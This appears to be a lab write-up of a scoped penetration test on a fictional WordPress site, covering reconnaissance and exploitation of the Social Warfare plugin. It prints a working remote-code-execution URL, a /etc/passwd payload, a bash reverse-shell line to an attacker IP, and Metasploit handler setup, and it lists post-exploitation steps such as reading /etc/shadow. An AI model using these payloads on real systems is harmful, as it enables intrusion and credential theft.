# Penetration-test

## Objective
Evaluate the exploitability of vulnerabilities found on a website.
Simulate real-world attack scenarios to determine risk impact and potential consequences to an organization.

### Skills Learned

- General flow of a penetration test.
- Configure a firewall.
- How to navigate Metasploit interface.
- Scan with Nmap to populate a database.
- Scan for vulnerabilities with WPScan.
- Exploit a detected vulnerability.
- Weaponize an exploit to pop a shell.  

### Tools Used

- Kali Linux.
- Metasploit.
- NMap.
- WPScan.
- PfSense
  

## Steps
In this project we will perform a Penetration Test on a website. The following is the scope for the website: 0x2A Security: Penetration Test 📌
We’re concerned about the webserver you identified in your vulnerability assessment.

Primary objectives:
Assess whether the vulnerabilities identified in the previous vulnerability assessment can be exploited.
Simulate real-world exploitation scenarios to determine the risk impact and potential consequences of those vulnerabilities.
Provide actionable recommendations to remediate these vulnerabilities.
Target system:
Domain: www.megaquagga.local
IP Address Range: Confirm if the engagement covers ONLY properly-defined associated subdomains, subnets, or IP addresses tied to the website.
Assets Included: Only the public-facing website and its backend services.
Assets Excluded: Any systems not explicitly mentioned in the scope (e.g., internal networks, unrelated subdomains, third-party services).
Testing limitations:
The test will focus solely on exploitation of identified vulnerabilities, without:
Excessive brute-force attacks.
Denial-of-Service (DoS) or Distributed DoS (DDoS) testing, unless explicitly approved.
Data destruction or alteration

Beginning to look at the infrastructure included in the designated scope constitutes Phase 1 (Information Gathering (Reconnaissance)) of this penetration test.
We will conduct all our offensive security tasks from the Red-Team Workstation.

We launch a browser and enter the following URL: http://www.megaquagga.local

<img width="1047" alt="Screenshot 2025-04-16 at 7 43 00 AM" src="https://github.com/user-attachments/assets/6f594ede-5f77-4cf1-96e4-7a6805805659" />


Now we take a look from another angle.
Let’s check if we have network connectivity by reaching the megaquagga.local website via ping.
We open a new terminal window and enter the following ping command:
ping www.megaquagga.local

<img width="1046" alt="Screenshot 2025-04-16 at 8 00 57 AM" src="https://github.com/user-attachments/assets/dc5220dd-e401-4899-9ff7-fbde750af967" />

It appears that the target system (or something sitting in-between us and the target system) is blocking ICMP packets. To change this we need to access the pfSense firewall’s administrative interface

<img width="1057" alt="Screenshot 2025-04-16 at 8 11 59 AM" src="https://github.com/user-attachments/assets/846b6add-d081-4e57-a67a-c5898d24d4df" />

Login and change the firewall policy.
In the top menubar, click on Firewall → Rules:

<img width="1051" alt="Screenshot 2025-04-16 at 8 17 16 AM" src="https://github.com/user-attachments/assets/8689cbc6-0e11-49a3-bb1e-d0d8f5b1c096" />

To allow our ping to pass through the firewall’s policy, we’ll now need to define a new rule that explicitly permits ICMP traffic within the appropriate network scope.
The WAN tab is displyed by default:

<img width="1051" alt="Screenshot 2025-04-16 at 8 25 55 AM" src="https://github.com/user-attachments/assets/93c377ba-a32b-43aa-90f9-228943694dba" />

We click the first green Add button to add a rule to the top of this firewall’s list of WAN policies:

<img width="1074" alt="Screenshot 2025-04-16 at 8 28 08 AM" src="https://github.com/user-attachments/assets/7c84530d-8263-4a13-a944-8d3b03cdb8c4" />

we need ping packets to pass through that means we need to enable ICMP.
Change Protocol to ICMP:
<img width="1045" alt="Screenshot 2025-04-16 at 8 32 54 AM" src="https://github.com/user-attachments/assets/7342cf93-3e55-4889-80cf-add3074b9c3b" />

We make all the nessary changes save and apply change.
We return to our Terminal window again run the ping command again: ping www.megaquagga.local

<img width="1042" alt="Screenshot 2025-04-16 at 8 40 51 AM" src="https://github.com/user-attachments/assets/85e82ff5-354d-43a3-a809-e80dbc919872" />

This time it works.
Now we will use Metasploit for testing and exploiting security vulnerabilities in the systems. 
First we open Metasploit with the following command: sudo msfconsole.





Let’s create a workspace named “quagga_0x2a”, where we will store the results of this assessment.
We create a new workspace with the following command: workspace -a quagga_0x2A
We verify the new workspace is active with the following command: workspace


<img width="504" alt="Screenshot 2025-04-16 at 9 14 43 AM" src="https://github.com/user-attachments/assets/f90c2c04-4a38-4b02-9542-0e09cc022873" />


Now we will run nmap within Metasploit using the website's IP address: db_nmap -A 192.168.100.2


<img width="1100" alt="Screenshot 2025-04-16 at 9 20 37 AM" src="https://github.com/user-attachments/assets/bc0fef56-be93-4767-b596-5a00613ca646" />

We now open a new terminal to run WPScan of the website with the following command: wpscan --url http://www.megaquagga.local


<img width="633" alt="Screenshot 2025-04-16 at 7 48 40 PM" src="https://github.com/user-attachments/assets/4b016bb9-7f97-4050-9380-ae2460026706" />


<img width="921" alt="Screenshot 2025-04-16 at 7 55 17 PM" src="https://github.com/user-attachments/assets/f64af23d-5846-481e-8c11-623e0b3e4b11" />

After running the scan we discover that there are outdated plugins, so we decided to exploit the plugin that was the most outdated which was Social-Warfare. After some research online about social-warfare exploit we choose one that involve creating a payload. we created a simple text file and type the following text in the file:<pre>system('cat /etc/passwd')</pre> and save it under the name payload.txt

<img width="955" alt="Screenshot 2025-04-16 at 8 12 43 PM" src="https://github.com/user-attachments/assets/0cd136f5-302f-4e50-a766-327213b58884" />


Now we have to sep up a server to to host the payload, to do this we open a new terminal and type the following: python3 -m http.server

<img width="569" alt="Screenshot 2025-04-16 at 8 22 42 PM" src="https://github.com/user-attachments/assets/c71173f6-a695-4976-a22f-5591d47403f7" />

Now it's time to test our payload, we create a new text file and add the exploitable URL into the blank text document: http://www.megaquagga.local/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.100.20:8000/payload.txt. 
We open a web browser and past the exploitable URL into the search and press enter 

<img width="1057" alt="Screenshot 2025-04-16 at 8 34 50 PM" src="https://github.com/user-attachments/assets/1009db47-c70d-45f8-9b0b-32d3c852515d" />

The exploit was a success, the browser displayed the contents of the megaquagga.local webserver’s /etc/password file. This confirms that we’ve executed the payload on the target server using its permissions — the exploit is now working on the target!
We now replace the test payload with the following reverse shell payload: <pre>exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.100.20/443 0>&1'");</pre>
We need to configuring the handler to catch your shell. A handler is a critical tool in penetration testing for managing connections from exploit payloads.
We open Metasploit and load the handler module. This module listens for connections from the payload and establishes a session. We use the following command to do this: use multi/handler

<img width="556" alt="Screenshot 2025-04-16 at 8 52 51 PM" src="https://github.com/user-attachments/assets/2ea0eac6-7ca6-4aef-83bd-c0cf82e57c97" />

We then use the following commands to configure the handler: set lhost 192.168.100.20 to set listener IP, set lport 443 to set listener port, and exploit -j to start the handler

<img width="562" alt="Screenshot 2025-04-16 at 9 00 38 PM" src="https://github.com/user-attachments/assets/f9df48ef-3cb3-46c2-843d-84381244f7a0" />

Now we execute the XSS URL: http://www.megaquagga.local/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.100.20:8000/payload.txt. Then we go back to the Metasploit terminal window to display the handler.

<img width="1296" alt="Screenshot 2025-04-16 at 9 33 37 PM" src="https://github.com/user-attachments/assets/ef7587f7-05ee-4d7b-b8ab-958a38d5ecb8" />

Once the payload executes, this output appearing in your Metasploit handler’s Terminal window indicates a new connection (”session”) has been created. The session confirms that the reverse shell connection from the target to your handler was successful. We check the active sessions in Metasploit to confirm that your reverse shell is connected with the following command: sessions -i
<img width="948" alt="Screenshot 2025-04-16 at 9 45 52 PM" src="https://github.com/user-attachments/assets/36ab763e-4f90-4c21-ac8a-a2bcf09d1510" />

To find out where our shell landed we use the whoami command.

<img width="625" alt="Screenshot 2025-04-16 at 9 51 39 PM" src="https://github.com/user-attachments/assets/2eeeae8d-0d81-4f29-868c-430bfb81c67c" />

We landed on root that means that we have full privileges of the system we can read, write, and execute anything. This is by far the happiest place to find your shell has landed.
From here we could extract credentials (cat /etc/shadow), disable security tools, create a persistent backdoor, or pivot to other machines.



Every screenshot should have some text explaining what the screenshot is about.
